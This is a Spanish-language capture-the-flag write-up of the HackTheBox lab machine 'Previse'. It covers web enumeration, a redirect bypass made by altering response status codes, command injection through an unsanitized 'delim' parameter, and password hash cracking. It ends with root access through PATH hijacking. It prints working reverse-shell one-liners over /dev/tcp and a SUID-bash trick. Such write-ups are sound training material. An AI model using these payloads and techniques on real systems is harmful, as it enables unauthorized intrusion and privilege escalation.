---
layout: post
title: Previse - Writeup
permalink: /htb/previse
tags: [Easy, Linux, Web, Hackthebox, Path Hijacking, Command injection, RCE, Fuerza Bruta]
description: Máquina Linux de dificultad Easy en la que, tras bypassear un redirect, entraremos a un Dashboard donde veremos el código fuente de la página, descubriremos una vulnerabilidad, nos aprovecharemos de esta para obtener acceso al sistema y, tras crackear una contraseña y realizar un Path Hijacking, ganaremos acceso como root.
categories: [Linux, Ciberseguridad, Hacking]
---

<p align="center">
    <img src="/img/previse/logo.png">
</p>

Máquina Linux de dificultad **Easy** en la que, tras bypassear un redirect, entraremos a un Dashboard donde veremos el código fuente de la web, descubriremos una vulnerabilidad, nos aprovecharemos de esta para obtener acceso al sistema y, tras crackear una contraseña y realizar un Path Hijacking, ganaremos acceso como root.

Sus estadisticas segun la comunidad son las siguientes:

![](/img/previse/stats.png)

## **Indice**

  - [Fase de reconocimiento](#1)
    - [Escaneo de puertos con nmap](#2)
  - [Enumeración](#3)
    - [Enumerando la Web](#4)
    - [Descubriendo rutas con Wfuzz](#5)
  - [Explotación](#6)
    - [Bypassing dal redirect y creando una cuenta](#7)
    - [Iniciando sesión e inspeccionando el código fuente de la Web](#8)
    - [Obteniendo Ejecución Remota de Comandos mediante la función exportar logs](#9)
    - [Obteniendo una Reverse Shell dentro de la máquina víctima](#10)
  - [De www-data a m4lwhere](#11)
  - [Escalada de privilegios](#12)
  - [Mi opinión sobre la máquina](#13)

# Fase de reconocimiento <a id=1></a>

## Escaneo de puertos con nmap <a id=2></a>

Vamos a escanear los puertos abiertos de la máquina, así como los servicios que corren en cada uno de estos. Para ello, usaremos la herramienta **nmap**:

```bash
$ nmap -p- --open -n -vvv --min-rate 5000 -Pn 10.10.11.104 -oG ports
```

Hecho esto, vamos a obtener la versión de cada servicio e información detallada sobre este. Para ello, también usaremos nmap:

```bash
$ nmap -p22,80 -sCV -n 10.10.11.104 -oN services

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-15 19:36 CET
Nmap scan report for 10.10.11.104
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

Como podemos ver, tenemos dos puertos abiertos:

| Puerto | Servicio |
|---|---|
| 22 | SSH (Secure SHell) |
| 80 | HTTP (Servidor Web) |

<br>

# Enumeración<a id=3></a>

## Enumerando la Web<a id=4></a>

Vamos a lanzarle un **whatweb** a la web que corre en el puerto 80:

```bash
$ whatweb 10.10.11.104

http://10.10.11.104 [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], RedirectLocation[login.php], Script, Title[Previse Home]

http://10.10.11.104/login.php [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], PasswordField[password], Script, Title[Previse Login]
```

Vemos que nos redirige a un **login.php**, vamos a echarle un ojo desde el navegador...

Antes de nada, por comodidad, añadimos el dominio `previse.htb` al archivo `/etc/hosts` para que este resuelva a la IP de la máquina: 

```bash
echo "10.10.11.104 previse.htb" >> /etc/hosts
```

Ahora si, vamos a entrar desde el navegador:

![](/img/previse/1.png)

Nos encontramos con un login: al probar diferentes credenciales, estas parecen no funcionar...

> En caso de que deje entrar con combinaciones como `admin:admin`, `admin:password`, `admin:root`... Esto quedra decir que esa cuenta existe, pero no es la manera "legit" de logearse en la Web. Esto se debe a que, como en HTB puede haber varios usuarios tratando de comprometer una misma máquina al mismo tiempo, alguno de estos usuario podría haber creado una cuenta con dichas credenciales. 

Tampoco funcionan las SQL Injections, así que vamos a intentar obtener más información sobre la Página Web.

## Descubriendo rutas con Wfuzz<a id=5</a>
Para ello usaremos Wfuzz:

```bash
$ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 --sc 200 http://previse.htb/FUZZ.php

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://previse.htb/FUZZ.php
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000319:   200        5 L      14 W       217 Ch      "footer"                                                             
000000186:   200        31 L     60 W       1248 Ch     "nav"                                                                
000000177:   200        20 L     64 W       980 Ch      "header"                                                             
000000039:   200        53 L     138 W      2224 Ch     "login"                                                              
000001476:   200        0 L      0 W        0 Ch        "config"  
...
```

Podemos ver varios archivos .php, vamos a entrar a algunos de ellos...

...

Tras buscar en los archivos, el único llamativo es el **nav.php**, ya que los demás están practicamente vacios.

![](/img/previse/nav.png)

Aquí podemos ver la barra de navegación de la Web, a la cual tenemos acceso sin necesidad de logearnos. Todos los enlaces parecen redirigirnos al panel de inicio de sesión. Para ver realmente lo que está pasando, vamos a interceptar la petición y la respuesta a esta con **BurpSuite**.

<br>

# Explotación<a id=6></a>

## Bypassing dal redirect y creando una cuenta <a id=7></a>

Para ello, abrimos BurpSuite, le decimos a nuestro navegador que use el Proxy de **BurpSuite** (127.0.0.1:8080) mediante la extensión **FoxyProxy** o mediante la configuración del navegador e intentamos entrar al panel de `Create Account`. Una vez BurpSuite intercepte la petición, pulsamos click derecho > Do intercept > Response to this request, y le damos a `Forward`.

![](/img/previse/intercept.png)

Ahora podremos ver la respuesta por parte del servidor, donde se nos muestra el panel para crear una cuenta. Para verlo más claramente, le damos al botón `Render` para renderizar el HTML.

![](/img/previse/render.png)

> Esto puede deberse a que el servidor, a la hora de comprobar si tenemos una sesión, si ve que no, nos redirigirá al `login.php`, pero fuera de esa condicional, el servidor carga la Web. (Más adelante veremos como esta hecho!)

Visto esto, si continuamos investigando las peticiones, podemos ver que se nos vuelve a redirigir al login (Al no estar logeados). Entonces, si tratamos de cambiar el código de estado a `200 OK` para evitar que nos redirija...

![](/img/previse/200.png)

Le damos a `Forward`...

![](/img/previse/createacc.png)

Y estamos dentro del panel de registro. Ahora solo falta crearnos una cuenta (Respetando los requisitos que se nos muestran en pantalla) y probar a entrar con esta. Lo único que hay que hacer es rellenar el formulario y repetir el proceso de cambiar el código de estado de la respuesta con tal de no ser redirigidos al panel de login.

## Iniciando sesión e inspeccionando el código fuente de la Web<a id=8></a>

Al tratar de iniciar sesión, vemos que efectivamente, las credenciales que hemos introducido son válidas!!!!!!!! 

![](/img/previse/home.png)

Si entramos en el apartado `Files`, podemos ver un archivo `SITEBACKUP.zip` y una función para subir archivos la cual podemos descartar ya que los archivos no se cargan en el navegador, sino que son descargados directamente a nuestra máquina. Por lo tanto, vamos a investigar el archivo de backup:

```bash
$ chmod +x ./siteBackup.zip

$ unzip ./siteBackup.zip

rm ./siteBackup.zip
```

![](/img/previse/files.png)

Una vez descomprimido, podremos ver los archivos de la Web. Vamos a inspeccionarlos en busca de credenciales o vulnerabilidades.

- En el archivo `config.php` podemos obtener credenciales de MySQL que en un futuro podrían sernos útiles.
- En el archivo `logs.php` podemos encontrar un comentario junto con un `exec()` que llama a un archivo `Python`, pero, lo más importante de esto, utiliza el valor del parámetro `delim` que recibe por `POST` como parámetro del archivo `.py`, sin realizar ningún tipo de sanitización ...

> Si miramos a ver porque sucede lo del `redirect`, vemos que, a la hora de hacer la comprobación de si existe una sesión: en caso de que no exista, nos redirige al login, pero, como lo demás no se ve afectado por esta condicional `(if)`, carga sin importar su resultado. 

![](/img/previse/2022-01-09-13-25-24.png)

## Obteniendo Ejecución Remota de Comandos mediante la función de exportar logs<a id=9></a>

En vista de esto, vamos a tratar de enviarnos una traza ICMP (`ping -c 1 [IP]`) añadiéndole un punto y coma (;) antes. Esto lo podemos hacer de diversas maneras: ya sea cambiando el valor de `delim` desde BurpSuite, desde el código de la Web...

![](/img/previse/ping.png)

Antes de enviarlo, nos ponemos en escucha de trazas ICMP:

```bash
$ tcpdump -i tun0 icmp
```

> tun0 hace referencia a la interfaz de red de la VPN

![](/img/previse/icmp.png)

Vemos que recibimos la traza. Vamos a tratar de enviarnos una **Reverse Shell**.

## Obteniendo una Reverse Shell dentro de la máquina víctima<a id=10></a>

Para ello, substituimos el `ping` por `bash -c 'bash -i >& /dev/tcp/[IP]/443 0>&1';`, nos ponemos en escucha por el puerto en cuestión (En mi caso, 443) y le damos a enviar:

![](/img/previse/shell.png)

Si todo va bien, al mirar el `Listener`, podremos ver que estamos dentro de la máquina como el usuario `www-data`.

![](/img/previse/cone.png)

Ahora, podemos convertir esta Shell en una **Shell Interactiva** ejecutando los siguientes comandos:

```bash
$ script /dev/null -c bash
...
[CTRL + Z]
...
$ stty raw -echo;fg
...
reset
xterm
...
$ export SHELL=bash
$ export TERM=xterm
...
```

Y ya podríamos movernos más cómodamente sin estar preocupándonos porque se nos pierda la conexión al pulsar CTRL + C 😁.

<br>

# De www-data a m4lwhere<a id=11></a>

Ahora que ya estamos como `www-data`, vamos a ver como podemos convertirnos en `m4lwhere`...

...

Si recordamos bien, al revisar el código fuente de la Web, pudimos encontrar credenciales de MySQL, vamos a tratar de entrar a ver si sacamos credenciales...

```bash
$ mysql -u root -p -D previse
Enter password: ...
```

Estamos dentro, vamos a enumerar bases de datos, tablas, etcétera.

```bash
...
mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
```

Vamos a listar el contenido de la tabla `accounts`.

```bash
mysql> select * from accounts;

+----+---------------+------------------------------------+---------------------+
| id | username      | password                           | created_at          |
+----+---------------+------------------------------------+---------------------+
|  1 | m4lwhere      | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.   | 2021-05-27 18:18:36 |
+----+---------------+------------------------------------+---------------------+
```

Podemos ver el hash del usuario `m4lwhere`. Vamos a intentar crackearlo por si este usuario utiliza la misma contraseña para la Web y para su usuario...

```bash
$ hashcat -m 500 hash /usr/share/wordlists/rockyou.txt
...
```

> El hecho de que el hash tenga un salero, no debería afectar a la hora de romperlo. Es normal que en algunas terminales no llegue a cargar correctamente. Esto es conocido como el `salt` del hash y, de hecho, si nos fijamos en el código, podremos ver que también aparece.

Tras pasar un rato, este dará con la contraseña. La copiamos e intentamos cambiar al usuario `m4lwhere` proporcionando esa contraseña:

> Es normal que el hash tarde en romperse. Aunque, por lo general, las contraseñas de las máquinas Easy suelen tardar menos en romperse.

```bash
$ su m4lwhere
Password: 
```

![](/img/previse/m4lwhere.png)

<br>

# Escalada de privilegios<a id=12></a>

Vamos a enumerar un poco el Sistema...

...

Si ejecutamos el comando `sudo -l` (Para listar lo que el usuario `m4lwhere` puede ejecutar como el usuario `root`) podremos ver lo siguiente:

```bash
$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

Vamos a ver el fichero que puede ejecutar...

```bash
$ cat /opt/scripts/access_backup.sh
```

```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

Si nos fijamos en como se ejecutan los binarios `gzip` y `date` (en cada una de las dos líneas del script), podemos concluir que se están ejecutando de manera insegura, es decir, usando su ruta relativa (Basándose en la variable `$PATH`).

En vista de esto, si conseguimos secuestrar alguno de los dos binarios (Por medio de un `Path Hijacking` o secuestro de la variable PATH), podremos ejecutar lo que queramos como el usuario `root`. Vamos a ello 😋.

> En mi caso, secuestraré el binario `date`

### Efectuando un Path Hijacking para ejecutar comandos como el usuario root

Bien, primero nos posicionamos en una ruta donde tengamos privilegios (Como es `/tmp/`). Tras esto, debemos añadirle la ruta `/tmp/`  a la variable `PATH`:

```bash
$ export PATH=/tmp:$PATH
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Ya estaría añadido, ahora toca crear el nuevo fichero `date`, pero con una **Reverse Shell**...

```bash
$ nano date
...
$ cat date
#!/bin/bash

bash -i >& /dev/tcp/[ip]/1234 0>&1
```

> También podríamos asignarle el permiso `SUID` a la `bash` con el siguiente comando dentro del binario:
> `chmod u+s /bin/bash`
> Y ejecutar `bash -p` para obtener una `bash` como el propietario

```bash
$ chmod +x date
```

Nos ponemos en escucha por el puerto 1234... (En mi caso)

```bash
$ nc -nlvp 1234
```

Y ejecutamos el script como `root`

```bash
$ sudo /opt/scripts/access_backup.sh
```

![](/img/previse/flag.png)

¡Y ya estaría! 😆

<br>

# Mi opinión sobre la máquina<a id=13></a>

Me parece una máquina perfecta para empezar. De hecho, fue la primera máquina activa que hice 😋. Es bastante sencilla y divertida, aunque en su momento, cuando la hice, tuve problemas a la hora de romper la contraseña. La recomiendo sobre todo a los nuevos usuarios, aunque también es buena para los más   experimentados.
